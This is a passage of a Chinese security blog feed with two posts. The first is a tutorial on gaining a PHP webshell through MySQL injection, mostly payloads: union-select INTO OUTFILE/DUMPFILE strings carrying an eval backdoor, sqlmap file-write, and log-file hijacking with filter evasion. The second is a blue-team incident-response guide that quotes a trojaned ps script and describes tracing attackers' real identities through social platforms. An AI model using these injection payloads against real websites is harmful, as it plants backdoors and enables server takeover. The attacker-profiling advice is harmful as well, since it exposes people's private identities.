    <id>https://micgo.top/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/MySQL%E6%B3%A8%E5%85%A5%E5%86%99shell/</id>
    <published>2023-03-21T16:00:00.000Z</published>
    <updated>2023-03-22T12:30:56.891Z</updated>
    
    <content type="html"><![CDATA[<h4 id="SQL注入写shell"><a href="#SQL注入写shell" class="headerlink" title="SQL注入写shell"></a>SQL注入写shell</h4><h5 id="into-outfile写shell"><a href="#into-outfile写shell" class="headerlink" title="into outfile写shell"></a>into outfile写shell</h5><p>条件：</p><blockquote><p>1、知道web绝对路径</p><p>2、有文件写入权限(一般情况只有root用户有)</p><p>3、数据库开启了<code>secure_file_priv</code>设置</p></blockquote><p>secure_file_priv    查询语句：<code>show global variables like &quot;secure%&quot;; </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NULL   禁止限制操作 </span><br><span class="line">C:\    值为某一目录，则只能操作该目录下的文件 </span><br><span class="line">&#x27;&#x27;     为空，则表示不对读写文件进行限制，即可以写入任意磁盘文件(区分NULL)  </span><br></pre></td></tr></table></figure><p>secure_file_priv只能通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322183051771.png" alt="image-20230322183051771" style="zoom:45%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322135516187.png" alt="image-20230322135516187" style="zoom:67%;" /><p>然后就能用<code>select into outfile</code>写入<code>webshell</code></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322140000635.png" alt="image-20230322140000635" style="zoom:50%;" /><p>常见手法：</p><p>联合注入写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span>shell<span class="string">&#x27;]);?&gt;&quot;,3 into outfile &#x27;</span><span class="attr">C</span>:\\phpstudy\\<span class="variable constant_">WWW</span>\\sqli\\shell.<span class="property">php</span><span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><code>dumpfile</code>函数写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span>shell<span class="string">&#x27;]);?&gt;&quot;,3 into dumpfile &#x27;</span><span class="attr">C</span>:\\phpstudy\\<span class="variable constant_">WWW</span>\\sqli\\shell.<span class="property">php</span><span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>lines terminated by 写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/shell.php&#x27;</span> lines terminated by <span class="string">&#x27;&lt;?php phpinfo()?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//lines terminated by 可以理解为以每行终止的位置添加xx内容</span></span><br></pre></td></tr></table></figure><p>lines starting by 写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/shell.php&#x27;</span> lines starting by <span class="string">&#x27;&lt;?php phpinfo()?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//利用 lines starting by 语句拼接webshell的内容。lines starting by可以理解为以每行开始的位置添加xx内容</span></span><br></pre></td></tr></table></figure><p>fields terminated by 写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/work/shell.php&#x27;</span> fields terminated by <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//利用fields terminated by语句拼接webshell的内容  fields terminated by可以理解为以每个字段的位置添加xx内容</span></span><br></pre></td></tr></table></figure><p>columns terminated by 写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/shell.php&#x27;</span> <span class="variable constant_">COLUMNS</span> terminated by <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//利用fields terminated by语句拼接webshell的内容 columns terminated by 可以理解为以每个字段的位置添加xx内容</span></span><br></pre></td></tr></table></figure><p>sqlmap写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写入到 /tmp 目录下 (要写的文件，必须在kali本机里有)</span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?page=user-info.php&amp;username=a%27f%27v&amp;password=afv&amp;user-info-php-submit-button=View+Account+Details&quot;</span> -p <span class="string">&#x27;username&#x27;</span>  --file-write=<span class="string">&quot;shell.php&quot;</span>  --file-dest=<span class="string">&quot;/tmp/shell.php&quot;</span></span><br></pre></td></tr></table></figure><p>读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;文件名&#x27;)；</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322141028688.png" alt="image-20230322141028688" style="zoom:67%;" /><h5 id="日志写shell"><a href="#日志写shell" class="headerlink" title="日志写shell"></a>日志写shell</h5><p>MySQL的两个全局变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">general_log      日志保存状态，一共有两个值（ON/OFF）</span><br><span class="line">general_log_file 日志的保存路径</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322161018141.png" alt="image-20230322161018141" style="zoom: 67%;" /><p>如果目前这个<code>general_log</code>为off状态，那么日志就没有被记录进去，所以要先打开这个全局变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br></pre></td></tr></table></figure><p>打开过后，不管sql语句是否正确，日志文件中都会记录我们写的sql语句</p><p>接下来修改<code>general_log_file</code>，可以直接通过SQL语句修改，并且必须修改为如<code>.php</code>后缀的文件，不然马不能被解析</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpstudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\log.php&#x27;</span>;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322180312855.png" alt="image-20230322180312855" style="zoom: 50%;" /><p><code>接下来使用 select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;;</code> 查询语句，其实就是写马，让日志文件众留下这样一句查询语句</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322180736193.png" alt="image-20230322180736193"></p><p>但是最后也要考虑能不能成功的连接到马，像如果<code>secure_file_priv</code>固定为C:\，而网站是搭在D盘上，那把<code>general_log_file</code>修改为C盘下的文件也连接不到，除非还有文件包含漏洞等</p><p>这里还得修改日志文件log.php的路径，让他在网站目录下才能成功连接</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322182458681.png" alt="image-20230322182458681" style="zoom: 67%;" /><p>成功连接</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322182442934.png" alt="image-20230322182442934" style="zoom: 50%;" /><h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><p>条件比较苛刻</p><p>（1）union注入在这里行不通。要日志写马能够连接必须要修改<code>general_log_file</code>为比如<code>php</code>后缀的文件，不然马不能被解析，所以必须要先用到<code>set global general_log_file=&#39;xx.php&#39;;</code>，那么union注入就没机会了，union基本都是<code>?id=1 union select 1,2,select &#39;&#39;;</code>这样，不能执行<code>set</code>的</p><p>（2）有堆叠注入，要先<code>?id=1;set global general_log_file=&#39;xx.php&#39;;</code>，然后直接执行<code>?id=1;select &#39;木马&#39;;</code></p><p>不过要想有堆叠注入的条件，源码中必须要用到<code>mysqli_multi_query()</code>。一般后台查询数据库使用的语句都是用<code>mysql_query()</code>，所以堆叠注入在mysql上不常见。</p><p>（3）再者就是成功登录到别人的数据库里了，先<code>set global general_log_file=&#39;xx.php&#39;;</code>，然后直接执行<code>select &#39;木马&#39;;</code></p><p>（4）没有对 <code>&#39; </code>和 <code>&quot;</code> 进行过滤，因为outfile后面的物理路径必须要有引号</p><h5 id="慢查询日志写shell"><a href="#慢查询日志写shell" class="headerlink" title="慢查询日志写shell"></a>慢查询日志写shell</h5><p>MySQL日志主要包含: 错误日志、查询日志、慢查询日志、事务日志。在 5.6.34版本以后secure_file_priv的值默认为NULL</p><p>MySQL的慢查询日志是MySQL提供的一种日志记录，它用来记录在MySQL中响应时间超过阀值的语句，long_query_time的默认值为10，意思是运行10S以上的语句。运行时间超过long_query_time值的SQL会被记录到慢查询日志中。使用慢查询主要针对日志量庞大，通过日志文件getshell出现问题的情况</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpstudy\\phpstudy_pro\\WWW\\slow.php&#x27;</span>; 日志路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log<span class="operator">=</span><span class="keyword">on</span>;   启用慢查询日志</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> log_queries_not_using_indexes<span class="operator">=</span><span class="keyword">on</span>;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322194438585.png" alt="image-20230322194438585" style="zoom: 67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set GLOBAL slow_query_log_file=&#x27;C:\\phpstudy\\phpstudy_pro\\WWW\\slow.php&#x27;;   //原理同上</span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27; or sleep(10);</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322193527824.png" alt="image-20230322193527824"></p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322193550168.png" alt="image-20230322193550168"></p><p>若对敏感字符进行过滤，可以采用字符串拼接(concat) 字符串替换(replace)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file =CONCAT(&quot;/var/www/html/shell.p&quot;,&quot;hp&quot;); </span><br><span class="line">set global general_log_file =REPLACE(&quot;/var/www/html/shell.jpg&quot;,&quot;jpg&quot;,&quot;php&quot;); </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;SQL注入写shell&quot;&gt;&lt;a href=&quot;#SQL注入写shell&quot; class=&quot;headerlink&quot; title=&quot;SQL注入写shell&quot;&gt;&lt;/a&gt;SQL注入写shell&lt;/h4&gt;&lt;h5 id=&quot;into-outfile写shell&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://micgo.top/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="shell" scheme="https://micgo.top/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>hw蓝队总结</title>
    <link href="https://micgo.top/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/hvv/"/>
    <id>https://micgo.top/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/hvv/</id>
    <published>2023-03-14T16:00:00.000Z</published>
    <updated>2023-03-22T12:21:33.984Z</updated>
    
    <content type="html"><![CDATA[<h4 id="红蓝对抗"><a href="#红蓝对抗" class="headerlink" title="红蓝对抗"></a>红蓝对抗</h4><h5 id="蓝队组成"><a href="#蓝队组成" class="headerlink" title="蓝队组成"></a>蓝队组成</h5><p>根据演习中角色和分工，有如下情况： </p><p>目标系统运营单位：参演单位，负责蓝队整体的组织和指挥。</p><p>安全运营团队：负责整体防护工作和攻击监控工作。 </p><p>攻防专家：负责对监控过程中发现的可疑攻击进行分析研判，指导安全运营团队、软件开发等一些 列相关部门对漏洞进行整改</p><p>安全厂商：负责对自身的安全产品的可用性、可靠性和防护监控策略是否合理，进行随时调整。 软件开发商：负责对自身系统安全加固、监控和配合攻防专家对发现的安全问题进行整改。 </p><p>网络运维团队：负责配合安全专家对网络建构安全、出口整体优化、网络监控、溯源等一些列工作。</p><p>云（如有）提供商，负责对自身云系统安全加固，以及对云上系统的安全进行监控同时协助攻防专 家对发现问题进行整改</p><h5 id="决战阶段"><a href="#决战阶段" class="headerlink" title="决战阶段"></a>决战阶段</h5><p>避免不必要减分情况，提前进行攻击拦截，主动获得各种加分项，及时控制风险。 </p><p>工作内容：通告处置，封堵封禁，预警监控，分析研判，应急响应，事件上报，策略优化，整改加固 </p><p>主要的4个团队：</p><p> 安全运营中心（监控和处置团队）：对每个安全警报分类、快速收集关键信息，并根据研判结果进行处 置 研判管理团队：向利益相关者提供证据、建议和意见，确定处理事件的节奏 安全专家团队：参与重要和高优先级事件</p><p> 威胁狩猎团队：确定事件的根本原因，还原攻击路径 研判是核心，要具备攻防能力，熟悉网络和业务，充分发挥指挥家的作用。向前端，对监控人员发现的 攻击预警进行分析确认；向后端，知道协助处置团队和狩猎团队对攻击进行处置和溯源。 </p><p>监控团队，尽量要做到全面覆盖，网络边界，内网办公区，应用系统，主机系统要全面布局安全检测手段，尽量多的使用不同监控方式，只要不影响业务，监测手段越多元化越好</p><p> 处置团队，提高单位时间内的处置效率，最短时间内采取最直接有效的技术手段进行遏制，防止攻击蔓 延。事件处置环节，应该联合网络，系统，应用等等多个岗位人员共同处置</p><p>总结：闭环安全风险 </p><h5 id="总结阶段"><a href="#总结阶段" class="headerlink" title="总结阶段"></a>总结阶段</h5><p>经验、教训</p><p>整改、完善</p><h4 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h4><p>在发现有入侵者后，快速由守转攻，进行精准地溯源反制，收集攻击路径和攻击者身份信息，勾勒出完整的攻击者画像</p><h5 id="IP-反查域名"><a href="#IP-反查域名" class="headerlink" title="IP 反查域名"></a>IP 反查域名</h5><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316184645453.png" alt="image-20230316184645453" style="zoom:67%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316184701935.png" alt="image-20230316184701935" style="zoom:67%;" /><h5 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h5><p>社交平台 支付宝 微信 抖音 github  百度 谷歌 csdn 百度贴吧 社工库</p><p>ip定位技术 id追踪术——溯源案例: 利用 id 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</p><p>网站 url：域名Whois 查询注册人姓名、地址、电话和邮箱——溯源案例：通过攻击 IP 历史解析记录&#x2F;域名，对域名注册信息进行溯源分析3.3.4 </p><h5 id="常见攻击源"><a href="#常见攻击源" class="headerlink" title="常见攻击源"></a>常见攻击源</h5><p>安全设备报警，如扫描 IP、威胁阻断、病毒木马、入侵事件等  </p><p>日志与流量分析，异常的通讯流量、攻击源与攻击目标等 </p><p>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</p><p>邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等 </p><p>蜜罐系统，获取攻击者行为、意图的相关信息</p><h5 id="邮件钓鱼攻击溯源"><a href="#邮件钓鱼攻击溯源" class="headerlink" title="邮件钓鱼攻击溯源"></a>邮件钓鱼攻击溯源</h5><p>攻防场景：攻击者利用社会工程学技巧伪造正常邮件内容，绕过邮件网关的查杀，成功投递到目标邮箱，诱骗用户点击邮件链接或下载附件文件</p><p>信息收集： 通过查看邮件原文，获取发送方 IP 地址、域名后缀邮箱、钓鱼网站或恶意附件样本等信息</p><p>溯源方式：第一种，可以通过相关联的域名&#x2F;IP 进行追踪；第二种，对钓鱼网站进行反向渗透获取权限，进一步收集攻击者信息；第三种，通过对邮件恶意附件进行分析，利用威胁情报数据平台寻找同源样本获取信息，也能进一步对攻击者的画像进行勾勒</p><h5 id="Web-入侵溯源"><a href="#Web-入侵溯源" class="headerlink" title="Web 入侵溯源"></a>Web 入侵溯源</h5><p>攻防场景：攻击者通过 NDAY 和 0DAY 漏洞渗入服务器网段，Webshell 触发安全预警或者威胁检测阻断了 C&amp;C 域名的通讯</p><p>溯源方式：</p><p>隔离 webshell 样本，使用 Web 日志还原攻击路径，找到安全漏洞位置进行漏洞修复</p><p>从日志可以找到攻击者的 IP 地址，但攻击者一般都会使用代理服务器或匿名网络（例如 Tor）来掩盖其真实的 IP 地址</p><h5 id="恶意样本同源分析"><a href="#恶意样本同源分析" class="headerlink" title="恶意样本同源分析"></a>恶意样本同源分析</h5><p>提取样本特征、用户名、ID、邮箱、C2 服务器等信息</p><p>溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者</p><h5 id="蜜罐溯源"><a href="#蜜罐溯源" class="headerlink" title="蜜罐溯源"></a>蜜罐溯源</h5><p>攻防场景：在企业内网部署蜜罐去模拟各种常见的应用服务，诱导攻击者攻击</p><p>溯源方式：在攻击者入侵蜜罐时，蜜罐可以记录攻击者的入侵行为，获取攻击者的主机信息、浏览器信息、甚至是真实 IP 及社交信息</p><h4 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h4><p><strong>准备 检测  抑制  根除  恢复  跟踪</strong></p><p>被攻击&#x2F;入侵的表现：</p><blockquote><p>网站类型：被篡改，信息丢失，乱码等<br>文件类型：被篡改，丢失，泄露等<br>系统类型：系统卡顿，CPU爆满，服务宕机等<br>流量类型：大量异常数据包，外部连接，网络网速卡顿等<br>第三方类型：服务异常，运行异常等</p></blockquote><p>事件信息收集：windows-linux-MAC</p><blockquote><p>对外服务情况<br>开放端口情况<br>系统版本<br>网络环境<br>漏洞情况<br>软件相关平台信息<br>口令整理收集<br>具备的防护情况</p></blockquote><p>事件攻击类型：</p><blockquote><p>WEB：漏洞攻击，综合类型攻击，流量攻击<br>第三方：数据库，远程软件，服务平台<br>操纵系统：权限提权，内网渗透，远程漏洞</p></blockquote><p>事件追查：   根据事件的表现选择最佳方法追查与排查</p><blockquote><p>1.日志分析<br>2.后门分析<br>3.流量分析<br>4.脚本软件分析<br>5.模拟渗透方法分析</p></blockquote><p>没有具体的信息需要全面摸查，通常以下总结的思路排查<br>1.web漏洞-检查源码类型以及漏洞情况<br>2.中间件漏洞-检查对应的版本 以及漏洞情况<br>3.第三方组件应用漏洞-检查使用存在最新的漏洞情况<br>4.操作系统层面导致漏洞-检查系统版本补丁漏洞情况<br>5.其他安全问题（弱口令，后门等），使用相关的shell，弱口令检查工具扫描</p><p><strong>攻防演练&#x2F;重保过程中，发生真实攻击，如何应急&#x2F;流程？</strong></p><p>0.（攻击确认）研判分析确定为真实攻击，攻击ip封禁</p><p>1.（范围确定）根据安全设备确定受影响资产&#x2F;主机设备</p><p>2.（事件类型）勒索&#x2F;挖矿&#x2F;蠕虫&#x2F;钓鱼&#x2F;webshell流量&#x2F;反弹shell&#x2F;外联&#x2F;敏感操作</p><p>3.（抑制扩散&#x2F;横向）甲方允许&#x2F;且对业务不造成重大影响的情况下对已沦陷设备，进行一个断网阻断&#x2F;或者是不出网的防火墙策略，或是web业务下线</p><p>4.（主机排查）根据事件类型上机排查，结束目标&#x2F;外联&#x2F;恶意进程，再对目标可能存在的权限维持手段进行排查清除</p><p>5.（影响范围）基于hids主机防御系统，查看失陷主机有没有进行一个内网横向渗透阶段，关注同网段主机设备是否存在被攻击&#x2F;失陷可能</p><p>6.（事件分析）基于 流量态势感知ids&#x2F;主机防御系统 hids（或是web日志，主机日志），找出红方攻击流程，漏洞利用点，漏洞分析&#x2F;钓鱼邮件分析&#x2F;恶意程序，攻击时间段，攻击ip，影响范围</p><p>7.（修复加固）出具修复&#x2F;加固方案</p><p>8.（输出报告）红方&#x2F;攻击流程&#x2F;利用阶段，蓝方应急响应&#x2F;阻断情况&#x2F;漏洞分析&#x2F;修复加固&#x2F;业务上线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure><h5 id="排查网络连接"><a href="#排查网络连接" class="headerlink" title="**排查网络连接   **"></a>**排查网络连接   **</h5><p><strong>netstat -anpt</strong></p><p>发现服务器192.168.226.132 一直与恶意IP  192.168.226.131的6666端口连接，并且程序名为：shell.elf     PID为11393和15634</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316224819714.png" alt="image-20230316224819714" style="zoom:50%;" /><p><strong>根据PID号查找程序位置   lsof -p 11393</strong></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316224957529.png" alt="image-20230316224957529" style="zoom: 45%;" /><p><strong>查看 shell.elf 文件的创建时间  stat shell.elf</strong></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316225043112.png" alt="image-20230316225043112" style="zoom:67%;" /><p>取shell.elf放到微步检测里去跑一跑</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316225135277.png" alt="image-20230316225135277" style="zoom:47%;" /><h5 id="排查历史命令"><a href="#排查历史命令" class="headerlink" title="**排查历史命令   **"></a>**排查历史命令   **</h5><p><strong>history</strong></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316225421455.png" alt="image-20230316225421455" style="zoom:50%;" /><p>在 root账户下排查是否有黑客执行的命令      cd &#x2F;root        cat .bash_history </p><h5 id="排查后门账户"><a href="#排查后门账户" class="headerlink" title="排查后门账户"></a><strong>排查后门账户</strong></h5><p><code>查看当前登录系统的用户 who</code></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316225458458.png" alt="image-20230316225458458" style="zoom:67%;" /><p><code>查看特权账户    awk -F: &#39;$3==0 &#123;print$1&#125;&#39; /etc/passwd</code></p><p><code>查看可以远程登录的帐号信息    awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p><p><code>查看用户最近登录情况   grep &quot;Accepted &quot; /var/log/secure* | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p><h5 id="排查定时任务"><a href="#排查定时任务" class="headerlink" title="排查定时任务"></a>排查定时任务</h5><p>查看服务器的定时任务  cd &#x2F;var&#x2F;spool&#x2F;cron     cat root</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316230032484.png" alt="image-20230316230032484" style="zoom:67%;" /><p>发现存在root账户的定时任务，每分钟执行一次 &#x2F;root&#x2F;shell.elf文件</p><h5 id="排查是否有命令被替换"><a href="#排查是否有命令被替换" class="headerlink" title="排查是否有命令被替换"></a>排查是否有命令被替换</h5><p>检查命令文件是否被替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rpm -Vf /usr/bin/*</span><br><span class="line">rpm -Vf /usr/sbin/*</span><br><span class="line">#rpm -Vf /usr/bin/xxx</span><br><span class="line">#S 关键字代表文件大小发生了变化</span><br><span class="line">#5 关键字代表文件的 md5 值发生了变化</span><br><span class="line">#T 代表文件时间发生了变化</span><br></pre></td></tr></table></figure><p>执行命令  rpm -Vf &#x2F;usr&#x2F;bin&#x2F;*  时发现 ps 命令的文件大小、md5 值、时间发生了变化，可能已经被修改</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316231823242.png" alt="image-20230316231823242" style="zoom: 50%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316231827437.png" alt="image-20230316231827437" style="zoom: 52%;" /><p> 查看ps命令内容     ls -al ps          cat ps</p><p>ps文件内容被修改成以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">/centos_core.elf &amp; /.hide_command/ps | grep -v <span class="string">&quot;shell&quot;</span> | grep -v <span class="string">&quot;centos_core&quot;</span> | grep <span class="string">&quot;bash&quot;</span></span><br><span class="line"><span class="comment">#每次执行ps命令都会执行centos_core.elf文件、.hide_command/ps文件</span></span><br><span class="line"><span class="comment">#grep -v的意思是只打印没有匹配的，而匹配的反而不打印，相当于隐藏shell、centos_core、bash异常文件信息</span></span><br></pre></td></tr></table></figure><h5 id="排查安全日志"><a href="#排查安全日志" class="headerlink" title="排查安全日志"></a>排查安全日志</h5><p>Linux:  &#x2F;var&#x2F;log下</p><blockquote><p>&#x2F;var&#x2F;log&#x2F;message   系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一<br>&#x2F;var&#x2F;log&#x2F;secure   与安全相关的日志信息<br>&#x2F;var&#x2F;log&#x2F;maillog   与邮件相关的日志信息<br>&#x2F;var&#x2F;log&#x2F;cron   与定时任务相关的日志信息<br>&#x2F;var&#x2F;log&#x2F;spooler   与UUCP和news设备相关的日志信息<br>&#x2F;var&#x2F;log&#x2F;boot.log   守护进程启动和停止相关的日志消息</p></blockquote><p>查看secure日志，发现爆破的时间范围是1.13 21：51：32——21：58：31</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316232659405.png" alt="image-20230316232659405"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat secure-20220421 | grep Failed</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316232718695.png" alt="image-20230316232718695" style="zoom:45%;" /><h5 id="清除后门文件"><a href="#清除后门文件" class="headerlink" title="清除后门文件"></a>清除后门文件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /root/shell.elf</span><br><span class="line">rm -rf /centos_core.elf</span><br></pre></td></tr></table></figure><p>将ps命令删除再将 .hide_command&#x2F;ps 恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /usr/bin/ps</span><br><span class="line">mv /.hide_command/ps  /usr/bin/ps</span><br></pre></td></tr></table></figure><p>删除后门账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/passwd</span><br><span class="line">#按dd删除某行</span><br></pre></td></tr></table></figure><h5 id="工具查杀"><a href="#工具查杀" class="headerlink" title="工具查杀"></a>工具查杀</h5><p><code>webshell</code>查杀：  D盾   百度WEBDIR+  河马  <code>Sangfor WebShellKill </code>(深信服)</p><p> shell查杀：  360星图  ELK  Splunk   遇到不同环境，搜索中间件日志或者对应网站的日志位置</p><p><strong>总结：</strong>人工+工具分析，大的用工具，小的可以人工分析</p><h5 id="webshell检测"><a href="#webshell检测" class="headerlink" title="webshell检测"></a>webshell检测</h5><p>静态检测：匹配特征码，特征值，危险函数</p><p>动态检测：WAF、IDS等设备 </p><p>日志检测：通过IP访问规律，页面访问规律筛选，文件完整性监控</p><h4 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h4><p><strong>Waf</strong></p><p>Web应用防火墙是通过执行一系列针对HTTP或者HTTPS的安全策略来专门为Web应用提供保护的一款产品。WAF对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等</p><p>宝塔  安全狗</p><p>ips 入侵防御系统（IPS一般也是在网络层旁路，可以理解为具备阻断能力的IDS，是IDS的升级版（也有IDS检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层）</p><p>ids 入侵检测系统（IDS工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击）（奇安信天眼）</p><p>hids 主机入侵检测系统（青藤云设备 